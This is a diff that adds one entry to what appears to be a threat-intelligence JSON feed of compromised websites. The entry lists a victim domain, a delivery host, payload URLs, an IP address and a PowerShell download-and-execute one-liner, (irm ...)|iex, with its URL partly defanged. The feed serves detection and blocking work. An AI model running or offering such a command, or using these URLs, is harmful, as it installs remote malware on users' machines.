@@ -475,5 +475,24 @@
     ],
     "ReportId": "cmwq3hc8s25mj0oml7jzq2r5l",
     "ScannedAt": "2026-11-21T07:36:53.112000+00:00"
+  },
+  {
+    "UrlDomain": "www.miltonmovers.co.ke",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/a44602b46c6fe499"
+    ],
+    "IP": [
+      "23.153.104.141"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a44602b46c6fe499')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/a44602b46c6fe499"
+    ],
+    "ReportId": "cmwq86im425xo0omlz7z1faw6",
+    "ScannedAt": "2026-11-21T09:48:26.236000+00:00"
   }
 ]
